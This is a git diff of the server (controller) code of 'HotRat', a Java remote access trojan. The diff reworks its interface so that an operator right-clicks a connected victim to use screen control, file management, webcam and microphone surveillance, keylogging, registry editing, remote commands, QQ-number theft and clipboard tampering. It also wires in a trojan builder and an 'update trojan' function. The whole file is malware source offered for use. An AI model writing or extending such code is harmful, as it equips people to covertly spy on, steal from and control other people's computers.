@@ -1,10 +1,9 @@
 package me.server;
 
-import com.sun.java.swing.plaf.windows.WindowsButtonUI;
-import com.sun.jna.platform.WindowUtils;
 import me.server.createtrojan.CreateTrojan;
 import me.server.loadconfig.ConfigReader;
 import me.server.loadconfig.ConfigWriter;
+import me.server.loadconfig.SystemSettings;
 import me.server.receive.*;
 import me.server.utils.*;
 
@@ -12,27 +11,32 @@ import javax.imageio.ImageIO;
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
+import java.awt.event.MouseListener;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 public class Server {
-    public static HashMap<String,Socket> map = new HashMap<>();
+    public static ConcurrentHashMap<String,Socket> map = new ConcurrentHashMap<>();
     public static DefaultTableModel defaultListModel;
     public static DefaultTableModel defaultTableModel;
     static ServerSocket socket;
     static Socket mesocket;
-    static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
-    static String LookAndFeel = System.getProperty("user.dir") + "\\LookAndFeel.cfg";
+    public static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
     public static String port;
-    public static final String VERSION = "7.35";
+    public static String lookandfeel;
+    public static String head;
+    public static String password;
+    public static final String VERSION = "8";
+    public static ConfigWriter configWriter = new ConfigWriter();
     static InputStream inputStream12 = Server.class.getClassLoader().getResourceAsStream("me/resources/maintable.png");
     static Image image12;
+    static ConfigReader configReader = new ConfigReader();
 
     static {
         try {
@@ -42,16 +46,18 @@ public class Server {
     }
     public static void main(String[] args) {
         try {
-            File file = new File(LookAndFeel);
-            ConfigWriter configWriter1 = new ConfigWriter(LookAndFeel);
-            ConfigWriter configWriter = new ConfigWriter(CFGPATH);
-            configWriter1.CreateCFG("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
-            configWriter.CreateCFG("port","11451");
-            JFrame frame = new JFrame("HotRat"+ VERSION + " |" + " Enjoy The Blue Screen :)");
-            if(file.exists()) {
-                UIManager.setLookAndFeel(ConfigReader.Read(LookAndFeel,"LookAndFeel"));
+            File file = new File(CFGPATH);
+            JFrame frame = new JFrame("HotRat "+ VERSION + " |" + " Goodbye, hotrat");
+            if(!file.exists()) {
+                configWriter.write(CFGPATH,"port","8000");
+                configWriter.write(CFGPATH,"head","Nachoneko");
+                configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
             }
-            port = ConfigReader.Read(CFGPATH,"port");
+            port = configReader.read(CFGPATH,"port");
+            lookandfeel = configReader.read(CFGPATH,"lookandfeel");
+            head = configReader.read(CFGPATH,"head");
+            password = configReader.read(CFGPATH,"password");
+            UIManager.setLookAndFeel(lookandfeel);
             defaultTableModel = new DefaultTableModel(null,new String[]{"时间","事件"});
             Date date = new Date();
             SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
@@ -95,11 +101,48 @@ public class Server {
             JScrollPane jScrollPane = new JScrollPane(chatTable);
             jScrollPane.setPreferredSize(new Dimension(0,100));
             frame.setIconImage(image);
+            JPopupMenu popupMenu = new JPopupMenu();
+            popupMenu.addSeparator();
+            JMenuItem popupItem = new JMenuItem("屏幕控制");
+            JMenuItem popupItem1 = new JMenuItem("系统管理");
+            JMenuItem popupItem2 = new JMenuItem("视频监控");
+            JMenuItem popupItem3 = new JMenuItem("注册表");
+            JMenuItem popupItem4 = new JMenuItem("键盘监听");
+            JMenuItem popupItem5 = new JMenuItem("远程聊天");
+            JMenuItem popupItem6 = new JMenuItem("更多功能");
+            JMenuItem popupItem7 = new JMenuItem("解除主机");
+            JMenuItem popupItem8 = new JMenuItem("语言监听");
+            JMenuItem popupItem9 = new JMenuItem("文件管理");
+            JMenuItem popupItem10 = new JMenuItem("远程命令");
+            popupItem.setIcon(new ImageIcon(image1));
+            popupItem9.setIcon(new ImageIcon(image10));
+            popupItem2.setIcon(new ImageIcon(image8));
+            popupItem3.setIcon(new ImageIcon(image7));
+            popupItem4.setIcon(new ImageIcon(image5));
+            popupItem5.setIcon(new ImageIcon(image4));
+            popupItem6.setIcon(new ImageIcon(image3));
+            popupItem7.setIcon(new ImageIcon(image2));
+            popupItem8.setIcon(new ImageIcon(image11));
+            popupItem9.setIcon(new ImageIcon(image10));
+            popupItem1.setIcon(new ImageIcon(image9));
+            popupItem10.setIcon(new ImageIcon(image6));
+            popupMenu.add(popupItem);
+            popupMenu.add(popupItem9);
+            popupMenu.add(popupItem1);
+            popupMenu.add(popupItem2);
+            popupMenu.add(popupItem8);
+            popupMenu.add(popupItem10);
+            popupMenu.add(popupItem3);
+            popupMenu.add(popupItem4);
+            popupMenu.add(popupItem5);
+            popupMenu.add(popupItem6);
+            popupMenu.add(popupItem7);
+            MouseListener mouseListener = new MyMouseAdapter(popupMenu);
             JMenuBar bar = new JMenuBar();
             JMenu menu = new JMenu("设置");
             JMenu menu1 = new JMenu("主题");
             JMenuItem jMenuItem = new JMenuItem("软件信息");
-            JMenuItem jMenuItem2 = new JMenuItem("监听端口");
+            JMenuItem jMenuItem2 = new JMenuItem("系统设置");
             JMenuItem jMenuItem1 = new JMenuItem("退出");
             JMenuItem jMenuItem3 = new JMenuItem("Swing");
             JMenuItem jMenuItem4 = new JMenuItem("Windows");
@@ -117,42 +160,6 @@ public class Server {
             defaultTableModel.addRow(new String[]{format.format(date),"作者联系QQ:511413324"});
             defaultTableModel.addRow(new String[]{format.format(date),"当前监听端口:" + port});
             JPanel panel = new JPanel();
-            JButton button = new JButton("屏幕控制");
-            button.setIcon(new ImageIcon(image1));
-            JButton button1 = new JButton("文件管理");
-            button1.setIcon(new ImageIcon(image2));
-            JButton button2 = new JButton("系统管理");
-            button2.setIcon(new ImageIcon(image3));
-            JButton button3 = new JButton("视频监控");
-            button3.setIcon(new ImageIcon(image4));
-            JButton button4 = new JButton("注册表");
-            button4.setIcon(new ImageIcon(image5));
-            JButton button5 = new JButton("远程命令");
-            button5.setIcon(new ImageIcon(image6));
-            JButton button6 = new JButton("键盘监听");
-            button6.setIcon(new ImageIcon(image7));
-            JButton button7 = new JButton("远程聊天");
-            button7.setIcon(new ImageIcon(image8));
-            JButton button8 = new JButton("更多功能");
-            button8.setIcon(new ImageIcon(image9));
-            JButton button9 = new JButton("解除主机");
-            button9.setIcon(new ImageIcon(image10));
-            JButton button10 = new JButton("语音监听");
-            button10.setIcon(new ImageIcon(image11));
-            JToolBar jToolBar = new JToolBar();
-            jToolBar.add(button);
-            jToolBar.add(button1);
-            jToolBar.add(button2);
-            jToolBar.add(button3);
-            jToolBar.add(button10);
-            jToolBar.add(button4);
-            jToolBar.add(button5);
-            jToolBar.add(button6);
-            jToolBar.add(button7);
-            jToolBar.add(button9);
-            jToolBar.add(button8);
-            jToolBar.setFloatable(false);
-            panel.add(jToolBar);
             menu.add(jMenuItem);
             menu.add(jMenuItem2);
             menu.add(jMenuItem7);
@@ -176,6 +183,7 @@ public class Server {
                     return false;
                 }
             };
+            table.addMouseListener(mouseListener);
             table.setFillsViewportHeight(true);
             table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
             table.getColumnModel().getColumn(0).setPreferredWidth(25);
@@ -213,14 +221,16 @@ public class Server {
                 System.exit(0);
             });
             jMenuItem2.addActionListener(a ->{
-               String str = JOptionPane.showInputDialog(null,"请输入监听的端口号","监听",JOptionPane.QUESTION_MESSAGE);
-               configWriter.Write("port",str);
-                JOptionPane.showMessageDialog(null,"端口已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
-                System.exit(0);
+                file.delete();
+                new SystemSettings();
             });
             jMenuItem3.addActionListener(a->{
                 try {
-                    configWriter1.Write("LookAndFeel","javax.swing.plaf.metal.MetalLookAndFeel");
+                    file.delete();
+                    configWriter.write(CFGPATH,"port",port);
+                    configWriter.write(CFGPATH,"lookandfeel","javax.swing.plaf.metal.MetalLookAndFeel");
+                    configWriter.write(CFGPATH,"head",head);
+                    configWriter.write(CFGPATH,"password",password);
                     JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                     System.exit(0);
                 }catch (Exception e) {
@@ -228,7 +238,11 @@ public class Server {
             });
             jMenuItem4.addActionListener(a->{
                 try {
-                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
+                    file.delete();
+                    configWriter.write(CFGPATH,"port",port);
+                    configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
+                    configWriter.write(CFGPATH,"head",head);
+                    configWriter.write(CFGPATH,"password",password);
                     JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                     System.exit(0);
                 }catch (Exception e) {
@@ -236,34 +250,54 @@ public class Server {
             });
             jMenuItem5.addActionListener(a->{
                 try {
-                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
+                    file.delete();
+                    configWriter.write(CFGPATH,"port",port);
+                    configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
+                    configWriter.write(CFGPATH,"head",head);
+                    configWriter.write(CFGPATH,"password",password);
                     JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                     System.exit(0);
                 }catch (Exception e) {
                 }
             });
             jMenuItem6.addActionListener(a->{
-                configWriter1.Write("LookAndFeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
+                file.delete();
+                configWriter.write(CFGPATH,"port",port);
+                configWriter.write(CFGPATH,"lookandfeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
+                configWriter.write(CFGPATH,"head",head);
+                configWriter.write(CFGPATH,"password",password);
                 JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                 System.exit(0);
             });
             jMenuItem9.addActionListener(a->{
-                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.smart.SmartLookAndFeel");
+                file.delete();
+                configWriter.write(CFGPATH,"port",port);
+                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.smart.SmartLookAndFeel");
+                configWriter.write(CFGPATH,"head",head);
+                configWriter.write(CFGPATH,"password",password);
                 JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                 System.exit(0);
             });
             jMenuItem10.addActionListener(a->{
-                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.luna.LunaLookAndFeel");
+                file.delete();
+                configWriter.write(CFGPATH,"port",port);
+                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.luna.LunaLookAndFeel");
+                configWriter.write(CFGPATH,"head",head);
+                configWriter.write(CFGPATH,"password",password);
                 JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                 System.exit(0);
             });
             jMenuItem11.addActionListener(a->{
-                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.hifi.HiFiLookAndFeel");
+                file.delete();
+                configWriter.write(CFGPATH,"port",port);
+                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.hifi.HiFiLookAndFeel");
+                configWriter.write(CFGPATH,"head",head);
+                configWriter.write(CFGPATH,"password",password);
                 JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                 System.exit(0);
             });
             jMenuItem7.addActionListener(a->{
-                CreateTrojan.Create();
+                new CreateTrojan(frame);
             });
             jMenuItem8.addActionListener(a->{
                 String[] modes = {"黑色","红色","蓝色"};
@@ -286,7 +320,7 @@ public class Server {
                         break;
                 }
             });
-            button.addActionListener(a->{
+            popupItem.addActionListener(a->{
                 try {
                     new Thread(() -> {
                         int temp = table.getSelectedRow();
@@ -298,7 +332,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button1.addActionListener(a->{
+            popupItem9.addActionListener(a->{
                 try {
                     new Thread(() -> {
                         int temp = table.getSelectedRow();
@@ -311,7 +345,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button2.addActionListener(a->{
+            popupItem1.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -323,7 +357,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button3.addActionListener(a->{
+            popupItem2.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -335,7 +369,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button4.addActionListener(a->{
+            popupItem3.addActionListener(a->{
                 try {
                     new Thread(() -> {
                         int temp = table.getSelectedRow();
@@ -347,7 +381,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button5.addActionListener(a->{
+            popupItem10.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -359,7 +393,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button6.addActionListener(a->{
+            popupItem4.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -371,7 +405,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button7.addActionListener(a->{
+            popupItem5.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -383,7 +417,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button10.addActionListener(a->{
+            popupItem8.addActionListener(a->{
                 try {
                     new Thread(() -> {
                         int temp = table.getSelectedRow();
@@ -395,7 +429,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button8.addActionListener(a->{
+            popupItem6.addActionListener(a->{
                 try {
                     new Thread(() -> {
                         String[] modes = {"远程弹窗","远程获取QQ号","蜂鸣器","内网映射","剪切板修改","图片展示","关闭图片展示","闪屏","网页打开","转移主机","更新小马"};
@@ -419,14 +453,14 @@ public class Server {
                                 break;
                             case "闪屏":
                                     String str =JOptionPane.showInputDialog(null,"闪屏文字..","闪屏",JOptionPane.INFORMATION_MESSAGE);
-                                    SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(StandardCharsets.UTF_8),map.get(strings));
+                                    SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(),map.get(strings));
                                 break;
                             case "内网映射":
                                 SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
                                 break;
                             case "网页打开":
                                     String strs =JOptionPane.showInputDialog(null,"输入URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
-                                    SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(StandardCharsets.UTF_8),map.get(strings));
+                                    SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(),map.get(strings));
                                 break;
                             case "图片展示":
                                 String strs1 =JOptionPane.showInputDialog(null,"输入图片URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
@@ -454,7 +488,7 @@ public class Server {
                 }catch (Exception e) {
                 }
             });
-            button9.addActionListener(a->{
+            popupItem7.addActionListener(a->{
                 try {
                     new Thread(() -> {
                     int temp = table.getSelectedRow();
@@ -468,6 +502,7 @@ public class Server {
                 }
             });
             socket = new ServerSocket(Integer.parseInt(port));
+            new SendHeartPack(frame,table,defaultListModel).start();
             while (true) {
                 mesocket = socket.accept();
                 executorService.execute(new ClientPage(mesocket,defaultListModel,frame,table));
@@ -504,7 +539,6 @@ class ClientPage implements Runnable{
     public void run() {
         try {
             DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
-            String head = "H0tRAT";
             String str1 = dataInputStream.readUTF();
             String str2 = dataInputStream.readUTF();
             String str3 = dataInputStream.readUTF();
@@ -516,7 +550,8 @@ class ClientPage implements Runnable{
             String str9 = dataInputStream.readUTF();
             String str10 = dataInputStream.readUTF();
             String str11 = dataInputStream.readUTF();
-            if(!str1.contains(head)) {
+            if (!str1.contains(Server.head)) {
+                mesocket.close();
                 return;
             }
             Date date = new Date();
@@ -534,7 +569,6 @@ class ClientPage implements Runnable{
             frame.setSize(1101,701);//强制刷新
             frame.setSize(1100,700);
             frame.repaint();
-            new SendHeartPack(mesocket,frame,table,tableModel,context,strings[1]).start();
             new ReceiveMessage(mesocket,str5).start();
         }catch (Exception e) {
             e.printStackTrace();
